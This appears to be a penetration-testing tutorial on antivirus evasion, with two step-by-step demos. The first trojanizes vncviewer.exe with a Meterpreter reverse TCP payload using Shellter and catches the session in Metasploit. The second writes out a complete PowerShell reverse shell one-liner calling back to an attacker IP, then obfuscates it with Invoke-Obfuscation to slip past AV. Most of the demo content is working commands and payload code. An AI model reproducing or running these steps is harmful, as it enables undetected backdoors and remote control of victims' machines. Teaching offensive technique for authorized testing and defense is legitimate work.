## AV Evasion With Shellter

### Defense Evasion

Defense Evasion consists of techniques that adversaries use to avoid detection thoroughout their compromise. Techiques used for defense evasion include uninstalling/disabling security software or **obfuscating/encrypting** data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. -MITRE 

### AV Detection Methods

AV software will typically utilize signature, heuristic and behaviour based detection.

1. Signature based detection - An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database.

We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature.

2. Heuristic-based detection - Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns withing the code or program calls.
3. Behaviour based detection - Relies on identifying malware by monitoring it's behaviour (Used for newer strains of malware).

### AV Evasion Techniques

**On-disk Evasion Techniques**
- Obfuscation - Obfuscation refers to the process of concealing something important, valuable, or critical. Obfuscation reorganizes code in order to make it harder to analyze or RE.
- Encoding - Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format.
- Packing - Generate executable with new binary structure with a smaller size and therefore provides the payload with a new signature.
- Crypters - Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub

**In-Memory Evasion Techniques**
- Focuses on manipulation of memory and does not write files to disk.
- Injects payload into a process by leveraging various Windows APIs.
- Payload is then executed in memory in a seperate thread.

## Demo: AV Evasion With Shellter

www.shellterproject.com

## Demo: Bypassing Antivirus with Shellter

### Step-by-Step Process

### Step 1: Installing Shellter and Wine32

Before we begin, we need to install **Shellter** and the **Wine32** package to support the execution of Windows programs on **Kali Linux**.

Install **Shellter**:

```bash
sudo apt-get install shellter -y
```

Enable support for 32-bit architecture:

```bash
sudo dpkg --add-architecture i386
```

Install **Wine32**:

```bash
sudo apt-get install wine32
```

### Step 2: Copy the Executable File

We need a legitimate Windows executable file to inject our payload into. In this case, we use **vncviewer.exe**, which can be found in the following directory:

```bash
cp /usr/share/windows-binaries/vncviewer.exe /home/kali/Desktop/AVBypass/
```

### Step 3: Starting Shellter

Navigate to the **Shellter** directory and run **Shellter** using **Wine**:

```bash
cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
```

### Step 4: Configuring Shellter

When **Shellter** starts, it will ask for the **mode** you want to use. We will use **Automatic Mode** by entering `A` for automatic:

```bash
A
```

Next, provide the **path** to the executable file you want to inject the payload into:

```bash
/home/kali/Desktop/AVBypass/vncviewer.exe
```

Enable **Stealth Mode** to bypass AV detection:

```bash
y
```

Choose the type of payload injection. We will select **L** for a **list of payloads**:

```bash
L
```

Choose payload `1`, which is a **Meterpreter reverse TCP payload**.

### Step 5: Setting Payload Options

Now, set the **LHOST** (your attacker's IP address, typically your Kali machine's IP address) and **LPORT** (the port on which you want to receive the connection):

- Set **LHOST** to your network interface, in this case, **eth1**.
- Set **LPORT** to 1234.

### Step 6: Starting the HTTP Server

Next, we need to serve the payload to the target. Set up a **Python web server** to serve the file:

Open a new terminal tab:

```bash
cd ~/Desktop/AVBypass
sudo python3 -m http.server 80
```

This will serve the **vncviewer.exe** payload from the **AVBypass** directory on port **80**.

### Step 7: Setting Up the Metasploit Handler

Go back to the terminal where **Metasploit** is running. We need to set up a **reverse shell handler** to catch the connection from the target system when the payload is executed.

Start **Metasploit**:

```bash
msfconsole
```

Use the **multi/handler** module to set up a reverse shell handler:

```bash
use multi/handler
```

Set the payload to match the one you selected in **Shellter**:

```bash
set payload windows/meterpreter/reverse_tcp
```

Set the **LHOST** and **LPORT** to the same values used in **Shellter**:

```bash
set lhost eth1
set lport 1234
```

Run the handler:

```bash
run
```

### Step 8: Executing the Payload on the Target

Now, transfer the **vncviewer.exe** file to the target system and execute it. Once executed, the **reverse shell** will connect back to your **Kali** machine, and you will gain a **Meterpreter session**.

### Step 9: Post-Exploitation

Once the payload is executed, you will receive a **Meterpreter session** on your **Kali** machine. You can verify this by checking the session in **Metasploit**:

```bash
sessions
```

Interact with the session:

```bash
sessions -i [sessionID]
```

You now have control over the target system and can perform further post-exploitation tasks.

### Conclusion

What we accomplished:
- Used **Shellter** to inject a **Meterpreter reverse TCP** payload into a legitimate **vncviewer.exe** file.
- Configured **Shellter** in **Stealth Mode** to bypass AV detection.
- Set up a **Metasploit** handler to catch the reverse shell connection.
- Successfully executed the payload on the target system and gained a **Meterpreter session**.

This demo demonstrates how to evade antivirus software using **Shellter** to inject malicious payloads into legitimate executables, allowing you to establish a reverse shell on the target system.

## Obfuscating PowerShell Code

### Obfuscation

- Obfuscation refers to the process of concealing something important, valuable, or critical. Obfuscating reorganizes code in order to make it harder to analyze or RE.
- As a pentester we will find ourselfes working with PowerShell code frequently. Most AV solutions will immediately flag malicious PowerShell code, as a result, we must be able to obfuscate/encode our PowerShell code and scripts in order to avoid detection.

### Invoke-Obfuscation

GitHub repo: https://github.com/danielbohannon/Invoke-Obfuscation

## Demo: Obfuscating PowerShell Code

### Step-by-Step Process

### Step 1: Installing PowerShell on Kali

First, we need to install **PowerShell** on Kali Linux:

```bash
sudo apt-get install powershell -y
```

Start **PowerShell** (pwsh):

```bash
pwsh
```

### Step 2: Installing Invoke-Obfuscation Module

Navigate to the **Invoke-Obfuscation** directory and import the **Invoke-Obfuscation** module into your PowerShell session:

```bash
cd ./Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1
```

Start the **Invoke-Obfuscation** interface:

```bash
Invoke-Obfuscation
```

### Step 3: Creating the PowerShell Reverse Shell Script

Create a **reverse shell** PowerShell script. This is a basic PowerShell command that opens a reverse connection back to the attacker's machine.

For example, the script might look like this:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[YourIP]',[Port]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- Modify the script by removing `powershell -nop -c"` and the quotation mark at the end.
- Change the **IP address** and **LPORT** to match your Kali machine's configuration.
- Save the script as `shell.ps1`.

### Step 4: Loading the Script into Invoke-Obfuscation

Load the script into **Invoke-Obfuscation** for obfuscation:

```powershell
Invoke-Obfuscation> SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
```

### Step 5: Encoding and Obfuscating the Script

In **Invoke-Obfuscation**, navigate to the **Encoding** section to begin obfuscating the script.

```powershell
Invoke-Obfuscation> Encoding
```

Re-set the **script path** for obfuscation:

```powershell
Invoke-Obfuscation\Encoding> SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
```

You can always check for more help:

```powershell
Invoke-Obfuscation\Encoding> help
```

### Step 6: Obfuscating PowerShell AST Nodes

To make the script harder to detect, we obfuscate the **Abstract Syntax Tree (AST) nodes** of the PowerShell script.

```powershell
Invoke-Obfuscation\Encoding> AST
```

Obfuscate all nodes:

```powershell
Invoke-Obfuscation\AST> ALL
```

Select the first option to proceed with the obfuscation:

```powershell
Invoke-Obfuscation\AST> 1
```

Once obfuscation is complete, save the newly obfuscated script into a text file.

### Step 7: Transfer the Obfuscated Script to the Target System

To transfer the obfuscated script to the target system, set up a **Netcat listener** and a **Python web server** to serve the file.

#### Start a Netcat listener on your Kali machine:

```bash
nc -nvlp 1234
```

#### Start a Python web server to host the script:

```bash
sudo python3 -m http.server 80
```

#### Download the obfuscated script from the target system:

On the target system, open a browser and download the obfuscated PowerShell script from your Kali machine.

### Step 8: Executing the Obfuscated Script on the Target

Once the script is downloaded, execute it on the target system. If the script is successfully obfuscated, it should not be detected by AV, and the PowerShell window will remain open.

If the AV detects the script, the PowerShell window will close immediately.

### Step 9: Receiving the Reverse Shell

In your **Netcat listener window** on the Kali machine, press **Enter** to finalize the connection. Once connected, you will have a **reverse shell** from the target system.

### Conclusion

What we accomplished:
- Installed **PowerShell** and the **Invoke-Obfuscation** module on Kali Linux.
- Created a **reverse shell** PowerShell script and obfuscated it using **Invoke-Obfuscation**.
- Transferred the obfuscated script to the target system and executed it to gain a **reverse shell** without triggering AV detection.

This demo illustrates how to use **Invoke-Obfuscation** to bypass antivirus detection by modifying and obfuscating PowerShell scripts.



